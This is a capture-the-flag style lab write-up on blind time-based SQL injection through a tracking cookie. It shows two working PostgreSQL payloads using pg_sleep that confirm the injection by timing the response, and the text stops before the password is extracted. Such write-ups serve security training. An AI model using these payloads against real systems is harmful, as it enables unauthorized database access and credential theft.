
# Lab: Blind SQL injection with time delays and information retrieval

## Lab Information

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

## Step to Reproduce

### Testing Entries

- The `TrackingID` parameter in the `/` path of the web application is vulnerable to SQLi.
- The below payloads are used to verify it. In the below payload `%3B` is URL encoding for `;` 

```sql
'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

- The above payload results in the application to return the response after 10 seconds while the below payload results in the application to respond without delay proving the application is vulnerable to Time Delay based SQLi.

```sql
'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

